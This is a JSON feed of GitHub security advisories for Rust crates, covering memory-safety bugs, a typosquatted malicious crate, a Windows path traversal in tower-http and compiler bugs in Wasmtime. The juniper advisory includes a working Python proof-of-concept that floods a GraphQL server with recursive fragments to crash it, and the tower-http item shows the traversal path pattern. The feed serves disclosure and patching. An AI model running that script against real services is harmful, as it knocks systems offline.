{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Rust crates",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/rust.json",
    "description": "Security Advisory for Rust crates on GitHub",
    "items": [
        {
            "content_html": "<p>An issue was discovered in the heapless crate before 0.6.1 for Rust. The IntoIter Clone implementation clones an entire underlying Vec without considering whether it has already been partially consumed.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-36464\">https://nvd.nist.gov/vuln/detail/CVE-2020-36464</a></li>\n<li><a href=\"https://github.com/japaric/heapless/issues/181\">https://github.com/japaric/heapless/issues/181</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2020-0145.html\">https://rustsec.org/advisories/RUSTSEC-2020-0145.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qgwf-r2jj-2ccv\">https://github.com/advisories/GHSA-qgwf-r2jj-2ccv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qgwf-r2jj-2ccv",
            "title": "[heapless] Use after free in heapless",
            "date_modified": "2022-08-13T03:06:55.000Z",
            "date_published": "2021-08-25T20:56:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qgwf-r2jj-2ccv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in the rulinalg crate through 2020-02-11 for Rust. There are incorrect lifetime-boundary definitions for RowMut::raw_slice and RowMut::raw_slice_mut.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-35879\">https://nvd.nist.gov/vuln/detail/CVE-2020-35879</a></li>\n<li><a href=\"https://github.com/AtheMathmo/rulinalg/issues/201\">https://github.com/AtheMathmo/rulinalg/issues/201</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2020-0023.html\">https://rustsec.org/advisories/RUSTSEC-2020-0023.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q2gj-9r85-p832\">https://github.com/advisories/GHSA-q2gj-9r85-p832</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q2gj-9r85-p832",
            "title": "[rulinalg] Data races in rulinalg",
            "date_modified": "2022-08-13T03:06:31.000Z",
            "date_published": "2021-08-25T20:48:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q2gj-9r85-p832"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Affected versions of this crate called the RocksDB C API\n<code>rocksdb_open_column_families_with_ttl()</code> with a pointer to a single integer\nTTL value, but one TTL value for each column family is expected.</p>\n<p>This is only relevant when using\n<code>rocksdb::DBWithThreadMode::open_cf_descriptors_with_ttl()</code> with multiple\ncolumn families.</p>\n<p>This bug has been fixed in v0.19.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rust-rocksdb/rust-rocksdb/pull/616\">https://github.com/rust-rocksdb/rust-rocksdb/pull/616</a></li>\n<li><a href=\"https://github.com/rust-rocksdb/rust-rocksdb/releases/tag/v0.19.0\">https://github.com/rust-rocksdb/rust-rocksdb/releases/tag/v0.19.0</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2022-0046.html\">https://rustsec.org/advisories/RUSTSEC-2022-0046.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xpp3-xrff-w6rh\">https://github.com/advisories/GHSA-xpp3-xrff-w6rh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xpp3-xrff-w6rh",
            "title": "[rocksdb] rocksdb vulnerable to out-of-bounds read",
            "date_modified": "2022-08-12T15:31:11.000Z",
            "date_published": "2022-08-12T15:31:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xpp3-xrff-w6rh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Uninit memory is used as a RNG seed in temporary. This has been resolved in the 0.6.4 release. The crate is not intended to be used outside of a testing environment. For a general purpose crate to create temporary directories, <a href=\"https://crates.io/crates/tempfile\"><code>tempfile</code></a> is an alternative for this crate.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/stainless-steel/temporary/issues/2\">https://github.com/stainless-steel/temporary/issues/2</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2018-0022.html\">https://rustsec.org/advisories/RUSTSEC-2018-0022.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2jq9-6xx7-3h29\">https://github.com/advisories/GHSA-2jq9-6xx7-3h29</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2jq9-6xx7-3h29",
            "title": "[temporary] `temporary` makes use of uninitialized memory",
            "date_modified": "2022-08-11T18:10:53.000Z",
            "date_published": "2022-08-11T18:10:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2jq9-6xx7-3h29"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Rust Security Response WG and the crates.io team [were notified][1] on 2022-05-02 of the existence of the malicious crate <code>rustdecimal</code>, which contained malware. The crate name was intentionally similar to the name of the popular [<code>rust_decimal</code>][2] crate, hoping that potential victims would misspell its name (an attack called \"typosquatting\").</p>\n<p>To protect the security of the ecosystem, the crates.io team permanently removed the crate from the registry as soon as it was made aware of the malware. An analysis of all the crates on crates.io was also performed, and no other crate with similar code patterns was found.</p>\n<p>Keep in mind that the [<code>rust_decimal</code>][2] crate was <strong>not</strong> compromised, and it is still safe to use.</p>\n<h2 id=\"analysis-of-the-crate\">Analysis of the crate</h2>\n<p>The crate had less than 500 downloads since its first release on 2022-03-25, and no crates on the crates.io registry depended on it.</p>\n<p>The crate contained identical source code and functionality as the legit <code>rust_decimal</code> crate, except for the <code>Decimal::new</code> function.</p>\n<p>If your project or organization is running GitLab CI, we strongly recommend checking whether your project or one of its dependencies depended on the <code>rustdecimal</code> crate, starting from 2022-03-25. If you notice a dependency on that crate, you should consider your CI environment to be compromised.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/paupino/rust-decimal/issues/514#issuecomment-1115408888\">https://github.com/paupino/rust-decimal/issues/514#issuecomment-1115408888</a></li>\n<li><a href=\"https://groups.google.com/g/rustlang-security-announcements/c/5DVtC8pgJLw?pli=1\">https://groups.google.com/g/rustlang-security-announcements/c/5DVtC8pgJLw?pli=1</a></li>\n<li><a href=\"https://raw.globalsecuritydatabase.org/GSD-2022-1002520\">https://raw.globalsecuritydatabase.org/GSD-2022-1002520</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2022-0042.html\">https://rustsec.org/advisories/RUSTSEC-2022-0042.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7pwq-f4pq-78gm\">https://github.com/advisories/GHSA-7pwq-f4pq-78gm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7pwq-f4pq-78gm",
            "title": "[rustdecimal] `rustdecimal` is a malicious crate",
            "date_modified": "2022-08-11T15:43:36.000Z",
            "date_published": "2022-08-11T15:43:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7pwq-f4pq-78gm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>tower_http::services::fs::ServeDir</code> didn't correctly validate Windows paths, meaning paths like <code>/foo/bar/c:/windows/web/screen/img101.png</code> would be allowed and respond with the contents of <code>c:/windows/web/screen/img101.png</code>. Thus users could potentially read files anywhere on the filesystem.</p>\n<p>This only impacts Windows. Linux and other unix likes are not impacted by this.</p>\n<p>See <a href=\"https://github.com/tower-rs/tower-http/pull/204\">tower-http#204</a> for more details.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tower-rs/tower-http/pull/204\">https://github.com/tower-rs/tower-http/pull/204</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2022-0043.html\">https://rustsec.org/advisories/RUSTSEC-2022-0043.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrqq-9c63-xfrg\">https://github.com/advisories/GHSA-qrqq-9c63-xfrg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrqq-9c63-xfrg",
            "title": "[tower-http] tower-http's improper validation of Windows paths could lead to directory traversal attack",
            "date_modified": "2022-08-11T15:36:42.000Z",
            "date_published": "2022-08-11T15:36:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrqq-9c63-xfrg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>tower_http::services::fs::ServeDir</code> didn't correctly validate Windows paths, meaning paths like <code>/foo/bar/c:/windows/web/screen/img101.png</code> would be allowed and respond with the contents of <code>c:/windows/web/screen/img101.png</code>. Thus users could potentially read files anywhere on the filesystem.</p>\n<p>This only impacts Windows. Linux and other unix likes are not impacted by this.</p>\n<p>See <a href=\"https://github.com/tower-rs/tower-http/pull/204\">tower-http#204</a> for more details.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tower-rs/tower-http/pull/204\">https://github.com/tower-rs/tower-http/pull/204</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2022-0043.html\">https://rustsec.org/advisories/RUSTSEC-2022-0043.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrqq-9c63-xfrg\">https://github.com/advisories/GHSA-qrqq-9c63-xfrg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrqq-9c63-xfrg",
            "title": "[tower-http] tower-http's improper validation of Windows paths could lead to directory traversal attack",
            "date_modified": "2022-08-11T15:36:42.000Z",
            "date_published": "2022-08-11T15:36:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrqq-9c63-xfrg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<ul>\n<li><code>OwningRef::map_with_owner</code> is <a href=\"https://github.com/Kimundi/owning-ref-rs/issues/77\">unsound</a> and may result in a use-after-free.</li>\n<li><code>OwningRef::map</code> is <a href=\"https://github.com/Kimundi/owning-ref-rs/issues/71\">unsound</a> and may result in a use-after-free.</li>\n<li><code>OwningRefMut::as_owner</code> and <code>OwningRefMut::as_owner_mut</code> are <a href=\"https://github.com/Kimundi/owning-ref-rs/issues/61\">unsound</a> and may result in a use-after-free.</li>\n<li>The crate <a href=\"https://github.com/Kimundi/owning-ref-rs/issues/49\">violates Rust's aliasing rules</a>, which may cause miscompilations on recent compilers that emit the LLVM <code>noalias</code> attribute.</li>\n</ul>\n<p>No patched versions are available at this time. While a pull request with some fixes is outstanding, the maintainer appears to be unresponsive.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/noamtashma/owning-ref-unsoundness\">https://github.com/noamtashma/owning-ref-unsoundness</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2022-0040.html\">https://rustsec.org/advisories/RUSTSEC-2022-0040.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9qxh-258v-666c\">https://github.com/advisories/GHSA-9qxh-258v-666c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9qxh-258v-666c",
            "title": "[owning_ref] owning_ref vulnerable to multiple soundness issues",
            "date_modified": "2022-08-10T17:27:42.000Z",
            "date_published": "2022-08-10T17:26:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9qxh-258v-666c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"impact\">Impact</h2>\n<p>Untrusted websocket connections can cause an out-of-memory (OOM) process abort in a client or a server.\nThe root cause of the issue is during dataframe parsing.\nAffected versions would allocate a buffer based on the declared dataframe size, which may come from an untrusted source.\nWhen <code>Vec::with_capacity</code> fails to allocate, the default Rust allocator will abort the current process, killing all threads. This affects only sync (non-Tokio) implementation. Async version also does not limit memory, but does not use <code>with_capacity</code>, so DoS can happen only when bytes for oversized dataframe or message actually got delivered by the attacker.</p>\n<p>This is a security concern for you, if</p>\n<ul>\n<li>your server application handles untrusted websocket connections</li>\n<li>OR your client application connects to untrusted websocket servers</li>\n</ul>\n<h2 id=\"patches\">Patches</h2>\n<p>The crashes are fixed in version <strong>0.26.5</strong> by imposing default dataframe size limits.\nAffected users are advised to update to this version.</p>\n<p>Note that default memory limits are rather large (100MB dataframes and 200 MB messages), so they can still cause DoS in some environments (i.e. 32-bit). New API has been added to fine tune those limits for specific applications.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Migrate your project to another, maintained Websocket library like Tungstenite.</li>\n<li>Accept only trusted WebSocket traffic.</li>\n<li>Filter the WebSocket traffic though some kind of proxy that ensures sanity limits on messages.</li>\n<li>Handle process aborts gracefully and limit process memory using OS tools.</li>\n</ul>\n<h2 id=\"credits\">Credits</h2>\n<p>This issue was reported by <a href=\"https://github.com/evanrichter\">Evan Richter</a> at ForAllSecure and found with <a href=\"https://forallsecure.com/mayhem-for-code\">Mayhem</a> and <a href=\"https://github.com/rust-fuzz/cargo-fuzz\">Cargo Fuzz</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/websockets-rs/rust-websocket/security/advisories/GHSA-qrjv-rf5q-qpxc\">https://github.com/websockets-rs/rust-websocket/security/advisories/GHSA-qrjv-rf5q-qpxc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-35922\">https://nvd.nist.gov/vuln/detail/CVE-2022-35922</a></li>\n<li><a href=\"https://github.com/websockets-rs/rust-websocket/commit/cbf6e9983e839d2ecad86de8cd1b3f20ed43390b\">https://github.com/websockets-rs/rust-websocket/commit/cbf6e9983e839d2ecad86de8cd1b3f20ed43390b</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2022-0035.html\">https://rustsec.org/advisories/RUSTSEC-2022-0035.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrjv-rf5q-qpxc\">https://github.com/advisories/GHSA-qrjv-rf5q-qpxc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrjv-rf5q-qpxc",
            "title": "[websocket] Rust-WebSocket memory allocation based on untrusted length",
            "date_modified": "2022-08-11T20:46:06.000Z",
            "date_published": "2022-08-06T05:20:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrjv-rf5q-qpxc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Unix-like operating systems may segfault due to dereferencing a dangling pointer in specific circumstances. This requires an environment variable to be set in a different thread than the affected functions. This may occur without the user's knowledge, notably in a third-party library.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workarounds are known.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/chronotope/chrono/issues/499\">https://github.com/chronotope/chrono/issues/499</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2020-0159.html\">https://rustsec.org/advisories/RUSTSEC-2020-0159.html</a></li>\n<li><a href=\"https://github.com/time-rs/time/issues/293\">https://github.com/time-rs/time/issues/293</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cqpr-pcm7-m3jc\">https://github.com/advisories/GHSA-cqpr-pcm7-m3jc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cqpr-pcm7-m3jc",
            "title": "[chrono] Potential segfault in `localtime_r` invocations",
            "date_modified": "2022-08-04T19:38:55.000Z",
            "date_published": "2022-06-16T23:48:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cqpr-pcm7-m3jc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"graphql-behaviour\">GraphQL behaviour</h3>\n<p>Nested fragment in GraphQL might be quite hard to handle depending on the implementation language.\nSome language support natively a max recursion depth. However, on most compiled languages, you should add a threshold of recursion.</p>\n<pre><code class=\"language-graphql\"># Infinite loop example\nquery {\n    ...a\n}\n\nfragment a on Query {\n    ...b\n}\n\nfragment b on Query {\n    ...a\n}\n</code></pre>\n<h3 id=\"poc-tldr\">POC TLDR</h3>\n<p>With max_size being the number of nested fragment generated.\nAt max_size=7500, it should instantly raise:</p>\n<p><img alt=\"\" src=\"https://i.imgur.com/wXbUx8l.png\"></p>\n<p>However, with a lower size, you will overflow the memory after some iterations.</p>\n<h3 id=\"reproduction-steps-juniper\">Reproduction steps (Juniper)</h3>\n<pre><code>git clone https://github.com/graphql-rust/juniper.git\ncd juniper\n</code></pre>\n<p>Save this POC as poc.py</p>\n<pre><code class=\"language-python\">import requests\nimport time\nimport json\nfrom itertools import permutations\n\nprint('=== Fragments POC ===')\n\nurl = 'http://localhost:8080/graphql'\n\nmax_size = 7500\nperms = [''.join(p) for p in permutations('abcefghijk')]\nperms = perms[:max_size]\n\nfragment_payloads = ''\nfor i, perm in enumerate(perms):\n    next_perm = perms[i+1] if i &lt; max_size-1 else perms[0]\n    fragment_payloads += f'fragment {perm} on Query' + '{' f'...{next_perm}' + '}'\n\npayload = {'query':'query{\\n  ...' + perms[0] + '\\n}' + fragment_payloads,'variables':{},'operationName':None}\n\nheaders = {\n  'Content-Type': 'application/json',\n}\n\ntry:\n    response = requests.request('POST', url, headers=headers, json=payload)\n    print(response.text)\nexcept requests.exceptions.ConnectionError:\n    print('Connection closed, POC worked.')\n</code></pre>\n<pre><code>cargo run\n[in separate shell] python3 poc.py\n</code></pre>\n<h3 id=\"credits\">Credits</h3>\n<p><a href=\"https://escape.tech\">@Escape-Technologies</a></p>\n<p>@c3b5aw \n@MdotTIM \n@karimhreda </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/graphql-rust/juniper/security/advisories/GHSA-4rx6-g5vg-5f3j\">https://github.com/graphql-rust/juniper/security/advisories/GHSA-4rx6-g5vg-5f3j</a></li>\n<li><a href=\"https://github.com/graphql-rust/juniper/commit/2b609ee057be950e3454b69fadc431d120e407bb\">https://github.com/graphql-rust/juniper/commit/2b609ee057be950e3454b69fadc431d120e407bb</a></li>\n<li><a href=\"https://github.com/graphql-rust/juniper/commit/8d28cdba6eb10f53490ba41d1b5cb40506c2de22\">https://github.com/graphql-rust/juniper/commit/8d28cdba6eb10f53490ba41d1b5cb40506c2de22</a></li>\n<li><a href=\"https://github.com/graphql-rust/juniper/blob/juniper-v0.15.10/juniper/CHANGELOG.md#01510-2022-07-28\">https://github.com/graphql-rust/juniper/blob/juniper-v0.15.10/juniper/CHANGELOG.md#01510-2022-07-28</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31173\">https://nvd.nist.gov/vuln/detail/CVE-2022-31173</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2022-0038.html\">https://rustsec.org/advisories/RUSTSEC-2022-0038.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4rx6-g5vg-5f3j\">https://github.com/advisories/GHSA-4rx6-g5vg-5f3j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4rx6-g5vg-5f3j",
            "title": "[juniper] Juniper is vulnerable to @DOS GraphQL Nested Fragments overflow",
            "date_modified": "2022-08-10T23:51:29.000Z",
            "date_published": "2022-07-29T22:29:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4rx6-g5vg-5f3j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Executing deeply nested queries may cause stack overflow.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to <code>v4.0.6</code></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/async-graphql/async-graphql/security/advisories/GHSA-xq3c-8gqm-v648\">https://github.com/async-graphql/async-graphql/security/advisories/GHSA-xq3c-8gqm-v648</a></li>\n<li><a href=\"https://github.com/async-graphql/async-graphql/commit/521769b80039fc8043d1c9883e3d6e5b57359072\">https://github.com/async-graphql/async-graphql/commit/521769b80039fc8043d1c9883e3d6e5b57359072</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2022-0037.html\">https://rustsec.org/advisories/RUSTSEC-2022-0037.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xq3c-8gqm-v648\">https://github.com/advisories/GHSA-xq3c-8gqm-v648</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xq3c-8gqm-v648",
            "title": "[async-graphql] async-graphql / async-graphql - @DOS GraphQL Nested Fragments overflow",
            "date_modified": "2022-08-10T23:51:44.000Z",
            "date_published": "2022-07-29T22:22:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xq3c-8gqm-v648"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>There was a bug in Wasmtime's code generator, Cranelift, for AArch64 targets where constant divisors could result in incorrect division results at runtime. The translation rules for constants did not take into account whether sign- or zero-extension should happen, which resulted in an incorrect value being placed into a register when a division was encountered. For example, a constant 32-bit unsigned divisor of <code>0xfffffffe</code> would be incorrectly sign-extended to 64-bits to <code>0xfffffffffffffffe</code>. Any kind of division of operands smaller than 64 bits is implemented with a 64-bit division instruction which would then result in an incorrect result because the divisor was larger than expected.</p>\n<p>The impact of this bug is that programs executing within the WebAssembly sandbox would not behave according to the WebAssembly specification. This means that it is hypothetically possible for execution within the sandbox to go awry and WebAssembly programs could produce unexpected results. This should not impact hosts executing WebAssembly, but does affect the correctness of guest programs.</p>\n<p>This bug was found with differential fuzzing of Wasmtime against other engines on the AArch64 platform. Fuzzing on AArch64 is not regularly performed at this time and the Wasmtime team is investigating how best to continuously fuzz AArch64 in the same manner as x86_64.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This bug has been patched and users should upgrade to Wasmtime version 0.38.2.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If upgrading is not an option at this time, direct users of Cranelift that control the exact Cranelift instructions being compiled can avoid the vulnerability by explicitly extending constant divisors to 64 bits using either the <code>sextend.i64</code> or the <code>uextend.i64</code> operation.</p>\n<p>Note, though, that this issue only affects the AArch64 targets. Other platforms are not affected.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Reach out to us on <a href=\"https://bytecodealliance.zulipchat.com/#narrow/stream/217126-wasmtime\">the Bytecode Alliance Zulip chat</a></li>\n<li>Open an issue in <a href=\"https://github.com/bytecodealliance/wasmtime/\">the bytecodealliance/wasmtime repository</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-7f6x-jwh5-m9r4\">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-7f6x-jwh5-m9r4</a></li>\n<li><a href=\"https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41\">https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31169\">https://nvd.nist.gov/vuln/detail/CVE-2022-31169</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7f6x-jwh5-m9r4\">https://github.com/advisories/GHSA-7f6x-jwh5-m9r4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7f6x-jwh5-m9r4",
            "title": "[cranelift-codegen] Cranelift vulnerable to miscompilation of constant values in division on AArch64",
            "date_modified": "2022-07-25T19:26:29.000Z",
            "date_published": "2022-07-21T22:34:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7f6x-jwh5-m9r4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>There was a bug in Wasmtime's code generator, Cranelift, for AArch64 targets where constant divisors could result in incorrect division results at runtime. The translation rules for constants did not take into account whether sign- or zero-extension should happen, which resulted in an incorrect value being placed into a register when a division was encountered. For example, a constant 32-bit unsigned divisor of <code>0xfffffffe</code> would be incorrectly sign-extended to 64-bits to <code>0xfffffffffffffffe</code>. Any kind of division of operands smaller than 64 bits is implemented with a 64-bit division instruction which would then result in an incorrect result because the divisor was larger than expected.</p>\n<p>The impact of this bug is that programs executing within the WebAssembly sandbox would not behave according to the WebAssembly specification. This means that it is hypothetically possible for execution within the sandbox to go awry and WebAssembly programs could produce unexpected results. This should not impact hosts executing WebAssembly, but does affect the correctness of guest programs.</p>\n<p>This bug was found with differential fuzzing of Wasmtime against other engines on the AArch64 platform. Fuzzing on AArch64 is not regularly performed at this time and the Wasmtime team is investigating how best to continuously fuzz AArch64 in the same manner as x86_64.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This bug has been patched and users should upgrade to Wasmtime version 0.38.2.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If upgrading is not an option at this time, direct users of Cranelift that control the exact Cranelift instructions being compiled can avoid the vulnerability by explicitly extending constant divisors to 64 bits using either the <code>sextend.i64</code> or the <code>uextend.i64</code> operation.</p>\n<p>Note, though, that this issue only affects the AArch64 targets. Other platforms are not affected.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Reach out to us on <a href=\"https://bytecodealliance.zulipchat.com/#narrow/stream/217126-wasmtime\">the Bytecode Alliance Zulip chat</a></li>\n<li>Open an issue in <a href=\"https://github.com/bytecodealliance/wasmtime/\">the bytecodealliance/wasmtime repository</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-7f6x-jwh5-m9r4\">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-7f6x-jwh5-m9r4</a></li>\n<li><a href=\"https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41\">https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31169\">https://nvd.nist.gov/vuln/detail/CVE-2022-31169</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7f6x-jwh5-m9r4\">https://github.com/advisories/GHSA-7f6x-jwh5-m9r4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7f6x-jwh5-m9r4",
            "title": "[wasmtime] Cranelift vulnerable to miscompilation of constant values in division on AArch64",
            "date_modified": "2022-07-25T19:26:29.000Z",
            "date_published": "2022-07-21T22:34:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7f6x-jwh5-m9r4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a bug in Wasmtime's code generator, Cranelift, where functions using reference types may be incorrectly missing metadata required for runtime garbage collection (GC). This means that if a GC happens at runtime then the collector will mistakenly think some Wasm stack frames do not have live references to garbage collected values and therefore reclaim and deallocate them. The function can then subsequently continue to use the values, leading later to use-after-free bugs. This bug was introduced in Cranelift's migration to the <code>regalloc2</code> register allocator in the Wasmtime 0.37.0 release on 2022-05-20. This bug has been patched and users should upgrade to Wasmtime version 0.38.2.</p>\n<p>Mitigations for this issue can be achieved by doing one of:</p>\n<ul>\n<li>Disabling the reference types proposal by passing <code>false</code> to <a href=\"https://docs.rs/wasmtime/0.38.0/wasmtime/struct.Config.html#method.wasm_reference_types\"><code>wasmtime::Config::wasm_reference_types</code></a>.</li>\n<li>Downgrading to Wasmtime 0.36.0 or prior.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-5fhj-g3p3-pq9g\">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-5fhj-g3p3-pq9g</a></li>\n<li><a href=\"https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41\">https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31146\">https://nvd.nist.gov/vuln/detail/CVE-2022-31146</a></li>\n<li><a href=\"https://github.com/WebAssembly/reference-types\">https://github.com/WebAssembly/reference-types</a></li>\n<li><a href=\"https://github.com/bytecodealliance/wasmtime/\">https://github.com/bytecodealliance/wasmtime/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5fhj-g3p3-pq9g\">https://github.com/advisories/GHSA-5fhj-g3p3-pq9g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5fhj-g3p3-pq9g",
            "title": "[cranelift-codegen] Wasmtime vulnerable to Use After Free with `externref`s",
            "date_modified": "2022-08-05T13:56:04.000Z",
            "date_published": "2022-07-20T22:47:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5fhj-g3p3-pq9g"
            },
            "tags": [
                "severity"
            ]
        },
        {
